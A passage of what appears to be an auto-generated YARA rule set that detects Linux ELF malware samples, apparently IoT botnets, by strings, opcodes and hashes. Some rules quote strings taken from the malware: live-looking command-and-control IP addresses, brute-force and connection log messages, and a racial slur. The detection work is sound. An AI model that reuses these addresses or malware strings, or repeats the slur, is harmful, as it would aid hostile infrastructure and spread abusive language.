      $s19 = "pZN@-@" fullword ascii
      $s20 = "PN^NuNV" fullword ascii

      $op0 = { ff ff bc 62 00 00 ca 70 34 d0 ae ff b8 b0 ae ff }
      $op1 = { ff ff bc 63 00 01 6e 72 34 d2 ae ff b8 20 2e ff }
      $op2 = { ff 52 ae 00 08 2f 00 2f 2e 00 0c 61 ff ff ff fc }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_55 {
   meta:
      description = "Linux_55"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "1460c7e4d65af956ed85beffd667dfeffa92979f29767c3cb44ff6c8d39dd193"
   strings:
      $s1 = "wlancont" fullword ascii
      $s2 = "ff4cfg" fullword ascii

      $op0 = { 8f bf 00 34 8f b6 00 30 8f b5 00 2c 8f b4 00 28 }
      $op1 = { 3c 03 10 62 34 63 4d d3 00 43 00 18 00 02 1f c3 }
      $op2 = { a2 02 00 08 8f a3 00 34 12 60 00 03 a6 03 00 04 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_56 {
   meta:
      description = "Linux_56"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "197662eeaa9a2163f31dabe0007150336ff57795e5dc4134574b55f386e21339"
   strings:
      $s1 = "wlancont" fullword ascii

      $op0 = { f4 ff ff ff f4 ff ff ff a4 25 00 00 f4 ff ff ff }
      $op1 = { 20 02 00 04 e0 2d e5 40 30 9f e5 00 00 53 e3 04 }
      $op2 = { 20 02 00 44 25 02 00 0c 20 02 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_57 {
   meta:
      description = "Linux_57"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "20a934c2448d90a74770e2f18944db2169d2d4596ec1637dff2e1c282e3d0d2d"
   strings:
      $s1 = "wlancont" fullword ascii
      $s2 = " F>0 F" fullword ascii
      $s3 = " 0F$!`@" fullword ascii
      $s4 = "$`@B$8" fullword ascii
      $s5 = "$p@D$0" fullword ascii
      $s6 = "  F2  F" fullword ascii

      $op0 = { 06 00 1c 3c 34 c3 9c 27 21 e0 99 03 c8 ff bd 27 }
      $op1 = { 01 00 42 a2 34 00 a3 8f 30 00 a4 8f 48 00 a9 8f }
      $op2 = { 08 42 34 0c 00 82 ae 09 f8 20 03 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( all of them and all of ($op*) )
}

rule Linux_58 {
   meta:
      description = "Linux_58"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "45703fc7e2e662743d4d0d6f388d74bd7dbb1857128c2948a954d0448bcb2bef"
   strings:
      $s1 = "wlancont" fullword ascii
      $s2 = "\\})@P/" fullword ascii
      $s3 = "T8`J8H" fullword ascii
      $s4 = "}#XP9)" fullword ascii
      $s5 = " UTc@." fullword ascii
      $s6 = "}#Kx8!" fullword ascii
      $s7 = "}+ZxU)" fullword ascii
      $s8 = "})PP9I" fullword ascii
      $s9 = "})0P})Z" fullword ascii
      $s10 = "}#Kx|j" fullword ascii
      $s11 = "}@PPq`" fullword ascii
      $s12 = "}KSx;@" fullword ascii
      $s13 = "} HP|i" fullword ascii
      $s14 = "}eXP= " fullword ascii
      $s15 = "U+P*U " fullword ascii
      $s16 = "P})XP=`" fullword ascii
      $s17 = "P}iZ.9*" fullword ascii
      $s18 = "a)I7}#H" fullword ascii
      $s19 = "} 899+" fullword ascii
      $s20 = ">}*Kx9 " fullword ascii

      $op0 = { 92 a1 07 34 90 01 00 0c 3e a0 10 02 93 e1 07 5c }
      $op1 = { 94 21 ff f0 7c 08 02 a6 93 c1 00 08 3f c0 10 02 }
      $op2 = { 39 29 2c 44 80 7b fc 04 91 3c 00 00 54 84 10 3a }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_59 {
   meta:
      description = "Linux_59"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "465a502c15686d391047073011660c44db90d9944d341419dc47112bdb8b347f"
   strings:
      $s1 = "wlancont" fullword ascii

      $op0 = { ea 00 50 e0 e3 05 00 a0 e1 70 80 bd e8 10 40 2d }
      $op1 = { 70 40 2d e9 00 40 51 e2 46 df 4d e2 00 60 a0 e1 }
      $op2 = { ea 03 00 9d e8 08 d0 8d e2 70 80 bd e8 10 40 2d }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_60 {
   meta:
      description = "Linux_60"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "916c7d69455e63554f6cd468114e72247904d45c48348975d60a301c36d890f8"
   strings:
      $s1 = "wlancont" fullword ascii

      $op0 = { 0a 00 81 83 ed 34 30 97 e5 01 30 83 e2 34 30 87 }
      $op1 = { 5c e3 08 e0 8d e2 18 60 8e d2 03 00 00 da 24 c0 }
      $op2 = { ea 00 50 e0 e3 05 00 a0 e1 70 80 bd e8 10 40 2d }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_61 {
   meta:
      description = "Linux_61"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "aec65eb21ef7a244afc4109a8882c6fb0ba738d8348a8d6d4950040584d4a61a"
   strings:
      $s1 = "wlancont" fullword ascii
      $s2 = "LSpb0a,b" fullword ascii
      $s3 = "B.fra<1" fullword ascii
      $s4 = "pbLS0a,b" fullword ascii
      $s5 = "wLVpaCc%" fullword ascii
      $s6 = "\\1|1,2" fullword ascii
      $s7 = "j\"drc7" fullword ascii
      $s8 = "Sb}B:!Z\"" fullword ascii
      $s9 = "B#a=A,1" fullword ascii
      $s10 = "/Sn\"O}" fullword ascii
      $s11 = "2ar#sc" fullword ascii
      $s12 = "/sn\"O7" fullword ascii
      $s13 = "B3g9!)G,b" fullword ascii
      $s14 = "C:'#cz\"" fullword ascii
      $s15 = "20c,2NV-" fullword ascii
      $s16 = "-sQllH" fullword ascii
      $s17 = "bJ\" !ra<1" fullword ascii
      $s18 = "B#a=A(1mA(1" fullword ascii
      $s19 = "<cce-b" fullword ascii
      $s20 = "Rsh#7^" fullword ascii

      $op0 = { 64 d7 40 00 34 dd 41 00 78 d7 41 }
      $op1 = { 4c 64 73 60 15 44 15 8f 6c 66 53 61 04 71 10 61 }
      $op2 = { 64 d7 40 00 09 00 09 00 e6 2f 12 d1 22 4f 18 21 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_62 {
   meta:
      description = "Linux_62"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "8cd60b607f65b9c53daee913f717a408d30caaacadc189881a5f8dc10fc29bd9"
   strings:
      $s1 = "__stdio_mutex_initializer.3991" fullword ascii
      $s2 = "[0;97m ] Connected -> " fullword ascii
      $s3 = "Nigger Bruted -> %s [ %s:%s ]" fullword ascii
      $s4 = "__get_pc_thunk_bx" fullword ascii
      $s5 = "completed.2429" fullword ascii
      $s6 = "94.156.64.143:9821" fullword ascii
      $s7 = "libc/sysdeps/linux/i386/crtn.S" fullword ascii
      $s8 = "__restore" fullword ascii
      $s9 = "libc/sysdeps/linux/i386/crt1.S" fullword ascii
      $s10 = "object.2482" fullword ascii
      $s11 = "libc/sysdeps/linux/i386/crti.S" fullword ascii
      $s12 = "libc/sysdeps/linux/i386/mmap.S" fullword ascii
      $s13 = "[0;97m| Device: " fullword ascii
      $s14 = "[0;97m  | Endian " fullword ascii
      $s15 = "gayass.c" fullword ascii
      $s16 = "ay2fzc1txz22mldwtj4ipcevw5q8zq6" fullword ascii
      $s17 = "[0;91mNigger " fullword ascii
      $s18 = "VWSPh0p" fullword ascii
      $s19 = "prefix.4202" fullword ascii
      $s20 = "unknown.1161" fullword ascii

      $op0 = { 89 7c 24 64 39 d3 7c 34 89 d8 89 54 24 60 29 d0 }
      $op1 = { c7 44 24 1c fe ff ff ff 66 c7 44 24 18 d0 00 c6 }
      $op2 = { eb 02 31 ed 43 89 cf f7 c6 ef ff ff ff 75 24 83 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_63 {
   meta:
      description = "Linux_63"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0302a084d7d3f03d60c1827b965279ca72fa1d294326c25842ec8dd4fe733bb2"
   strings:
      $s1 = "__stdio_mutex_initializer.3991" fullword ascii
      $s2 = "__get_pc_thunk_bx" fullword ascii
      $s3 = "completed.2429" fullword ascii
      $s4 = "libc/sysdeps/linux/i386/crtn.S" fullword ascii
      $s5 = "__restore" fullword ascii
      $s6 = "libc/sysdeps/linux/i386/crt1.S" fullword ascii
      $s7 = "object.2482" fullword ascii
      $s8 = "libc/sysdeps/linux/i386/crti.S" fullword ascii
      $s9 = "libc/sysdeps/linux/i386/mmap.S" fullword ascii
      $s10 = "prefix.4202" fullword ascii
      $s11 = "unknown.1161" fullword ascii
      $s12 = "qual_chars.4208" fullword ascii
      $s13 = "spec_and_mask.4207" fullword ascii
      $s14 = "xdigits.3116" fullword ascii
      $s15 = "spec_ranges.4205" fullword ascii
      $s16 = "xAPPSh@" fullword ascii
      $s17 = "libc/sysdeps/linux/i386/vfork.S" fullword ascii
      $s18 = "spec_chars.4204" fullword ascii
      $s19 = "E4tmPh8" fullword ascii
      $s20 = "spec_flags.4203" fullword ascii

      $op0 = { 89 7c 24 64 39 d3 7c 34 89 d8 89 54 24 60 29 d0 }
      $op1 = { c7 44 24 1c fe ff ff ff 66 c7 44 24 18 d0 00 c6 }
      $op2 = { eb 02 31 ed 43 89 cf f7 c6 ef ff ff ff 75 24 83 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_64 {
   meta:
      description = "Linux_64"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "26265c88f305ed004f769964b7ec9d03ef3bbf400751e6c479a3dcfacb08df16"
   strings:
      $s1 = "__stdio_mutex_initializer.3991" fullword ascii
      $s2 = "__get_pc_thunk_bx" fullword ascii
      $s3 = "completed.2429" fullword ascii
      $s4 = "libc/sysdeps/linux/i386/crtn.S" fullword ascii
      $s5 = "__restore" fullword ascii
      $s6 = "libc/sysdeps/linux/i386/crt1.S" fullword ascii
      $s7 = "object.2482" fullword ascii
      $s8 = "libc/sysdeps/linux/i386/crti.S" fullword ascii
      $s9 = "libc/sysdeps/linux/i386/mmap.S" fullword ascii
      $s10 = "E4tmPh" fullword ascii
      $s11 = "prefix.4202" fullword ascii
      $s12 = "unknown.1161" fullword ascii
      $s13 = "qual_chars.4208" fullword ascii
      $s14 = "spec_and_mask.4207" fullword ascii
      $s15 = "xdigits.3116" fullword ascii
      $s16 = "spec_ranges.4205" fullword ascii
      $s17 = "libc/sysdeps/linux/i386/vfork.S" fullword ascii
      $s18 = "spec_chars.4204" fullword ascii
      $s19 = "spec_flags.4203" fullword ascii
      $s20 = "next_start.1109" fullword ascii

      $op0 = { 89 7c 24 64 39 d3 7c 34 89 d8 89 54 24 60 29 d0 }
      $op1 = { c7 44 24 1c fe ff ff ff 66 c7 44 24 18 d0 00 c6 }
      $op2 = { eb 02 31 ed 43 89 cf f7 c6 ef ff ff ff 75 24 83 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_65 {
   meta:
      description = "Linux_65"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "5afaee1ec920bf1c508bdcf9e4429cc5d157d4ae1052f83f0334a10374b95994"
   strings:
      $s1 = "__stdio_mutex_initializer.4160" fullword ascii
      $s2 = "__get_pc_thunk_bx" fullword ascii
      $s3 = "completed.2429" fullword ascii
      $s4 = "libc/sysdeps/linux/i386/crtn.S" fullword ascii
      $s5 = "__restore" fullword ascii
      $s6 = "been_there_done_that.3001" fullword ascii
      $s7 = "libc/sysdeps/linux/i386/crt1.S" fullword ascii
      $s8 = "object.2482" fullword ascii
      $s9 = "libc/sysdeps/linux/i386/crti.S" fullword ascii
      $s10 = "libc/sysdeps/linux/i386/mmap.S" fullword ascii
      $s11 = "xAPPSh@" fullword ascii
      $s12 = "libc/sysdeps/linux/i386/vfork.S" fullword ascii
      $s13 = "E4tmPh8" fullword ascii
      $s14 = "ipState.5283" fullword ascii
      $s15 = "qual_chars.4377" fullword ascii
      $s16 = "spec_or_mask.4375" fullword ascii
      $s17 = "spec_flags.4372" fullword ascii
      $s18 = "xdigits.3285" fullword ascii
      $s19 = "unknown.1330" fullword ascii
      $s20 = "spec_ranges.4374" fullword ascii

      $op0 = { 29 d0 8d 3c 03 8d 34 33 89 74 24 28 89 f2 8b 74 }
      $op1 = { 8d 6c 24 18 c7 44 24 1c fe ff ff ff 66 c7 44 24 }
      $op2 = { 89 7c 24 64 7c 34 89 d8 29 d0 85 c0 89 54 24 60 }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_66 {
   meta:
      description = "Linux_66"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "8024226804547c1acf8da768253fda56dc3204807e35d8fb1f5d67c957d0afbc"
   strings:
      $s1 = "__stdio_mutex_initializer.4160" fullword ascii
      $s2 = "__get_pc_thunk_bx" fullword ascii
      $s3 = "completed.2429" fullword ascii
      $s4 = "libc/sysdeps/linux/i386/crtn.S" fullword ascii
      $s5 = "__restore" fullword ascii
      $s6 = "been_there_done_that.3001" fullword ascii
      $s7 = "libc/sysdeps/linux/i386/crt1.S" fullword ascii
      $s8 = "object.2482" fullword ascii
      $s9 = "libc/sysdeps/linux/i386/crti.S" fullword ascii
      $s10 = "libc/sysdeps/linux/i386/mmap.S" fullword ascii
      $s11 = "E4tmPh" fullword ascii
      $s12 = "libc/sysdeps/linux/i386/vfork.S" fullword ascii
      $s13 = "qual_chars.4377" fullword ascii
      $s14 = "spec_or_mask.4375" fullword ascii
      $s15 = "spec_flags.4372" fullword ascii
      $s16 = "xdigits.3285" fullword ascii
      $s17 = "unknown.1330" fullword ascii
      $s18 = "spec_ranges.4374" fullword ascii
      $s19 = "spec_chars.4373" fullword ascii
      $s20 = "prefix.4371" fullword ascii

      $op0 = { 29 d0 8d 3c 03 8d 34 33 89 74 24 28 89 f2 8b 74 }
      $op1 = { 8d 6c 24 18 c7 44 24 1c fe ff ff ff 66 c7 44 24 }
      $op2 = { 89 7c 24 64 7c 34 89 d8 29 d0 85 c0 89 54 24 60 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_67 {
   meta:
      description = "Linux_67"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "78a790cdadf09d2445bd7af612275f517826366b9c915a8190f9621f5726993e"
   strings:
      $s1 = "E4tmPh" fullword ascii
      $s2 = "\\$XC;\\$" fullword ascii
      $s3 = "xAPPSh" fullword ascii
      $s4 = "PTRh1C" fullword ascii
      $s5 = "D$H9|$Hu" fullword ascii
      $s6 = "<rt><w" fullword ascii
      $s7 = "D$,PhXd" fullword ascii
      $s8 = ";t$@tF" fullword ascii
      $s9 = "|$'ftt" fullword ascii
      $s10 = "D$(9|$(t>" fullword ascii
      $s11 = "wcQWUR" fullword ascii

      $op0 = { 29 d0 8d 3c 03 8d 34 33 89 74 24 28 89 f2 8b 74 }
      $op1 = { 76 34 83 f8 06 c7 43 0c }
      $op2 = { c7 84 24 4c 01 00 00 ff ff ff 7f c7 84 24 a8 01 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_68 {
   meta:
      description = "Linux_68"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "8cfdcaf4611fd855672ad561de196417deea97341f45efd02e97e26d4674291d"
   strings:
      $s1 = "__get_pc_thunk_bx" fullword ascii
      $s2 = "set_thread_area failed when setting up thread-local storage" fullword ascii
      $s3 = "hoste.6860" fullword ascii
      $s4 = "__lll_unlock_wake_private" fullword ascii
      $s5 = "completed.4963" fullword ascii
      $s6 = "__libc_read:F(0,1)" fullword ascii
      $s7 = "libpthread/nptl/sysdeps/unix/sysv/linux/close.S" fullword ascii
      $s8 = " A/etc/hosts" fullword ascii
      $s9 = "SAVEBX1" fullword ascii
      $s10 = "RESTBX1" fullword ascii
      $s11 = "PUSHBX1" fullword ascii
      $s12 = "__restore" fullword ascii
      $s13 = "__GI___waitpid" fullword ascii
      $s14 = "__GI___libc_waitpid" fullword ascii
      $s15 = "__waitpid" fullword ascii
      $s16 = "uXPPj.S" fullword ascii
      $s17 = "_L_lock_205" fullword ascii
      $s18 = "_L_unlock_93" fullword ascii
      $s19 = "_L_unlock_232" fullword ascii
      $s20 = "_L_lock_53" fullword ascii

      $op0 = { 76 34 83 f8 06 c7 43 0c }
      $op1 = { 8d bd 5c ff ff ff fc f3 ab 89 4d ec 89 7d f0 8b }
      $op2 = { 8b 45 14 89 85 54 ff ff ff c7 85 58 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_69 {
   meta:
      description = "Linux_69"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "c7c37dcf6dbd7f91dba56449cad0e76ae3f4bedd2127996baef6aea33e5c49b7"
   strings:
      $s1 = "Unable To Connect to Target: %s:%d " fullword ascii
      $s2 = "Connected To Target: %s:%d " fullword ascii
      $s3 = "get_cmdline" fullword ascii
      $s4 = "commandparsing" fullword ascii
      $s5 = "cmdlinekillstrings" fullword ascii
      $s6 = "decodedshit" fullword ascii
      $s7 = "connecthosts" fullword ascii
      $s8 = "killer_cmdlinelol" fullword ascii
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2" fullword ascii
      $s10 = "cmdparse" fullword ascii
      $s11 = "pathread" fullword ascii
      $s12 = "remoteaddr" fullword ascii
      $s13 = "Sending requests to: %s:%d " fullword ascii
      $s14 = "__get_pc_thunk_bx" fullword ascii
      $s15 = "Device Connected [Name:%s] [Arch:%s] [UID:%d]" fullword ascii
      $s16 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s17 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5" fullword ascii
      $s19 = "attackpids" fullword ascii
      $s20 = "whitlistpaths" fullword ascii

      $op0 = { eb 28 ba 00 04 00 00 eb 21 ba ff ff ff 7f eb 1a }
      $op1 = { 65 c7 05 20 02 00 00 ff ff ff ff f0 65 83 0d 84 }
      $op2 = { cd 80 87 cb b8 f8 ff ff ff 65 c7 00 0c }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_70 {
   meta:
      description = "Linux_70"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "3f375d306ea72084864aedebf5a9becc7abe819d8c0fdeab14351145682689a6"
   strings:
      $s1 = "xAPPSh" fullword ascii
      $s2 = "whQWUR" fullword ascii
      $s3 = "D$p9D$," fullword ascii
      $s4 = "D$(j@j" fullword ascii
      $s5 = "D$$j@j" fullword ascii
      $s6 = "D$,PjL" fullword ascii
      $s7 = "D$ j@j" fullword ascii
      $s8 = "D$ JR**" fullword ascii
      $s9 = "^8PSh*i" fullword ascii
      $s10 = ";|$(t:WWj" fullword ascii
      $s11 = "C)QQWP" fullword ascii
      $s12 = "|$'fto" fullword ascii
      $s13 = ";T$(}Q" fullword ascii

      $op0 = { 51 8b 44 24 68 8b b0 54 fa ff ff 56 e8 34 b2 00 }
      $op1 = { 0f 8f bf f7 ff ff e9 2f ff ff ff c6 01 00 83 ec }
      $op2 = { e8 b0 7e 00 00 83 c4 10 e9 72 ff ff ff 83 ec 0c }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_71 {
   meta:
      description = "Linux_71"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "70767ddffc5a1a23c07e4eb479476d15c14a61a0c70bdc5bbcb8e6196426301e"
   strings:
      $s1 = "E4tmPh" fullword ascii
      $s2 = "PTRhF6" fullword ascii
      $s3 = "\\$Th0f" fullword ascii
      $s4 = "xAPPSh" fullword ascii
      $s5 = "whQWUR" fullword ascii
      $s6 = "D$ j@j" fullword ascii
      $s7 = "|$'fto" fullword ascii
      $s8 = "D$,Phxf" fullword ascii
      $s9 = "t$$h g" fullword ascii
      $s10 = "@tYPPj" fullword ascii
      $s11 = "^8QShD" fullword ascii
      $s12 = "^8PShD" fullword ascii
      $s13 = "tg@9D$" fullword ascii
      $s14 = "^8WShD" fullword ascii
      $s15 = ";|$(t:PPj" fullword ascii
      $s16 = "}/C;T$" fullword ascii

      $op0 = { 83 c4 20 39 44 24 04 7e 16 e9 00 ff ff ff 8b 4c }
      $op1 = { 89 7c 24 64 39 d3 7c 34 89 d8 89 54 24 60 29 d0 }
      $op2 = { 83 c4 10 83 c6 0c 3b 34 24 0f 84 57 ff ff ff 8b }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_72 {
   meta:
      description = "Linux_72"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e1e2097b1242ad423d1e6316d534625e7a0291b0c9db0654ab83448bc027eb87"
   strings:
      $s1 = "xAPPSh" fullword ascii
      $s2 = "D$(j@j" fullword ascii
      $s3 = ";T$(}Q" fullword ascii
      $s4 = ";|$(t:PPj" fullword ascii
      $s5 = "T$`VVj" fullword ascii
      $s6 = "9|$$tBPPj" fullword ascii
      $s7 = "D$,j@j" fullword ascii
      $s8 = "D$$Y[j" fullword ascii

      $op0 = { 83 c4 20 39 44 24 04 7e 16 e9 00 ff ff ff 8b 4c }
      $op1 = { b9 ff ff ff 7f c7 44 24 0c }
      $op2 = { 89 14 24 e9 4e ff ff ff 83 7c 24 0c 01 19 c0 83 }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( all of them and all of ($op*) )
}

rule Linux_73 {
   meta:
      description = "Linux_73"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "1e2a2f66d1a1c2e8afd287a815ee28064ea2a400bb540baa38d4b4bfd8b88b84"
   strings:
      $s1 = "\\$XQQj" fullword ascii
      $s2 = "\\$$SWV" fullword ascii
      $s3 = "\\$ThP5" fullword ascii
      $s4 = "xAPPSh" fullword ascii
      $s5 = ";T$(}Q" fullword ascii
      $s6 = ";|$(t:PPj" fullword ascii
      $s7 = "t$$h@6" fullword ascii
      $s8 = "D$,PjM" fullword ascii

      $op0 = { 31 c0 8b 14 24 8b 4c 24 44 8b 34 82 8d 04 40 8d }
      $op1 = { 83 c4 20 39 44 24 04 7e 16 e9 00 ff ff ff 8b 4c }
      $op2 = { b9 ff ff ff 7f c7 44 24 0c }
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      ( all of them and all of ($op*) )
}

rule Linux_74 {
   meta:
      description = "Linux_74"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d536f365c473b53e8136816794bbb2cebf5cea9c27264d850e80d1883881eff3"
   strings:
      $s1 = "euqevmk" fullword ascii
      $s2 = "pahagki" fullword ascii
      $s3 = "jbhagpmkj" fullword ascii
      $s4 = "tvmrepa" fullword ascii
      $s5 = "imgvkfqwmjaww" fullword ascii
      $s6 = "pwckmjckj" fullword ascii
      $s7 = "gkigkigki" fullword ascii
      $s8 = "vaehpao" fullword ascii
      $s9 = "jaskvejc" fullword ascii
      $s10 = "atmgvkqpav" fullword ascii
      $s11 = "jaswlaaj" fullword ascii
      $s12 = "lmormwmkj" fullword ascii
      $s13 = "wqttkvp" fullword ascii
      $s14 = "cvkqpav" fullword ascii
      $s15 = "emvhmra" fullword ascii
      $s16 = "wavrmga" fullword ascii
      $s17 = "nqejpagl" fullword ascii
      $s18 = "lwhsmbmgei" fullword ascii
      $s19 = "weiwqjc" fullword ascii
      $s20 = "45.142.182.90" fullword ascii

      $op0 = { 31 c0 8b 54 24 14 8b 4c 24 74 8b 34 82 8d 04 40 }
      $op1 = { 31 c0 8b 54 24 10 8b 4c 24 64 8b 34 82 8d 04 40 }
      $op2 = { 31 c0 8b 14 24 8b 4c 24 44 8b 34 82 8d 04 40 8d }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_75 {
   meta:
      description = "Linux_75"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "209c3d0b4901cfd0e5cd645161ed9f1e92d35df345aba7014889e0da5f89ee35"
   strings:
      $s1 = "ql22,!!!%" fullword ascii
      $s2 = " (w$Q.u" fullword ascii
      $s3 = "-b,j|a" fullword ascii
      $s4 = "j\"drc7" fullword ascii
      $s5 = "R#ay!p1" fullword ascii
      $s6 = "RRa(161" fullword ascii
      $s7 = "B<cmA{\"p" fullword ascii
      $s8 = ";\"s4\"!" fullword ascii
      $s9 = "V9\")A]C" fullword ascii
      $s10 = "AMB[!+'{!" fullword ascii
      $s11 = "Sb}B:!Z\"" fullword ascii
      $s12 = "`\"1!Cc" fullword ascii
      $s13 = "V2a,6f" fullword ascii
      $s14 = "g3amA|1Qf" fullword ascii
      $s15 = "#nla,b" fullword ascii
      $s16 = "Q{#+#y" fullword ascii
      $s17 = "A3`\\139" fullword ascii
      $s18 = ";\"G7\"!" fullword ascii
      $s19 = "d$Q u@" fullword ascii
      $s20 = ";\"s0\"!" fullword ascii

      $op0 = { ec 23 41 00 09 00 09 00 e6 2f 12 d1 22 4f 18 21 }
      $op1 = { ec 23 41 00 a4 26 42 00 00 24 42 }
      $op2 = { 4c 64 73 60 15 44 15 8f 6c 66 53 61 04 71 10 61 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_76 {
   meta:
      description = "Linux_76"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "72571f3e08306028c4f23cdd5a734015600686192b80d707817769b3dc4cdddc"
   strings:
      $s1 = "ql22,!!!%" fullword ascii
      $s2 = " (w$Q.u" fullword ascii
      $s3 = "-b,j|a" fullword ascii
      $s4 = "j\"drc7" fullword ascii
      $s5 = "R#ay!p1" fullword ascii
      $s6 = "RRa(161" fullword ascii
      $s7 = "B<cmA{\"p" fullword ascii
      $s8 = ";\"s4\"!" fullword ascii
      $s9 = "V9\")A]C" fullword ascii
      $s10 = "AMB[!+'{!" fullword ascii
      $s11 = "Sb}B:!Z\"" fullword ascii
      $s12 = "`\"1!Cc" fullword ascii
      $s13 = "V2a,6f" fullword ascii
      $s14 = "g3amA|1Qf" fullword ascii
      $s15 = "#nla,b" fullword ascii
      $s16 = "Q{#+#y" fullword ascii
      $s17 = "A3`\\139" fullword ascii
      $s18 = ";\"G7\"!" fullword ascii
      $s19 = "d$Q u@" fullword ascii
      $s20 = ";\"s0\"!" fullword ascii

      $op0 = { ec 23 41 00 09 00 09 00 e6 2f 12 d1 22 4f 18 21 }
      $op1 = { ec 23 41 00 a4 26 42 00 00 24 42 }
      $op2 = { 4c 64 73 60 15 44 15 8f 6c 66 53 61 04 71 10 61 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_77 {
   meta:
      description = "Linux_77"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "fd64b42ed9300b8c284bc7771bfd59fd9799b02f2b4af31b3c88497b6cb051b8"
   strings:
      $s1 = "FTPjGNRGP\"" fullword ascii
      $s2 = "FICMUHDKPJKCF" fullword ascii
